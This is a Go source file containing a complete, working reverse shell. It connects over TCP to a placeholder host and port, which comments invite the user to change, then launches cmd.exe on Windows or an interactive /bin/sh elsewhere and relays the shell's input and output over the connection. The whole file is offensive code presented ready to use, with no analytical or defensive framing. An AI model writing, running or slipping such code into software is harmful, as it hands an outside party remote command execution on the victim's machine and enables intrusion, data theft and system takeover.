package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// NOTE: change the ip or hostname
const TARGET_HOSTNAME = "example.com"
// NOTE: change the port
const TARGET_PORT = "1337" // Port as string for net.Dial

func main() {
	// 1. Establish TCP connection
	conn, err := net.Dial("tcp", TARGET_HOSTNAME+":"+TARGET_PORT)
	if err != nil {
		fmt.Printf("Failed to connect: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	// 2. Determine the shell to use based on OS
	var shellPath string
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shellPath = "cmd.exe"
		shellArgs = []string{} // cmd.exe doesn't typically need -i
	} else {
		shellPath = "/bin/sh"
		shellArgs = []string{"-i"} // -i for interactive mode
	}

	// 3. Spawn child process (the shell)
	cmd := exec.Command(shellPath, shellArgs...)

	// Configure stdin, stdout, stderr to be pipes
	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		fmt.Printf("Failed to create Stdin pipe: %v\n", err)
		os.Exit(1)
	}
	defer stdinPipe.Close()

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Printf("Failed to create Stdout pipe: %v\n", err)
		os.Exit(1)
	}
	defer stdoutPipe.Close()

	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		fmt.Printf("Failed to create Stderr pipe: %v\n", err)
		os.Exit(1)
	}
	defer stderrPipe.Close()

	// 4. Start the command
	if err := cmd.Start(); err != nil {
		fmt.Printf("Failed to start command: %v\n", err)
		os.Exit(1)
	}
	defer func() {
		// Attempt to kill the process if it's still running on exit
		if cmd.Process != nil {
			cmd.Process.Kill() // Best effort kill
		}
	}()

	// 5. Connect the shell's stdin/stdout/stderr to the network connection

	// Goroutine to send data from the network to the shell's stdin
	go func() {
		if _, err := io.Copy(stdinPipe, conn); err != nil {
			// Handle error (e.g., connection closed, pipe error)
			// For a simple reverse shell, we might just let the main loop
			// or other goroutines handle overall termination.
			fmt.Printf("Error copying from conn to stdin: %v\n", err)
		}
		stdinPipe.Close() // Close stdin pipe when done
	}()

	// Goroutine to send data from the shell's stdout to the network
	go func() {
		if _, err := io.Copy(conn, stdoutPipe); err != nil {
			fmt.Printf("Error copying from stdout to conn: %v\n", err)
		}
		// No need to close conn here, as other goroutines might still use it
	}()

	// Goroutine to send data from the shell's stderr to the network
	go func() {
		if _, err := io.Copy(conn, stderrPipe); err != nil {
			fmt.Printf("Error copying from stderr to conn: %v\n", err)
		}
		// No need to close conn here
	}()

	// Wait for the command to finish (the shell process to exit)
	// This will block until the shell process terminates.
	// If the shell exits, the main function will continue and eventually exit.
	// This is one way to manage the lifecycle; more robust solutions might
	// involve channels to signal termination across goroutines.
	if err := cmd.Wait(); err != nil {
		fmt.Printf("Command exited with error: %v\n", err)
	}

	// Add a small delay before exiting to ensure all buffered I/O has a chance to flush
	time.Sleep(1 * time.Second)
	fmt.Println("Reverse shell connection and process terminated.")
}
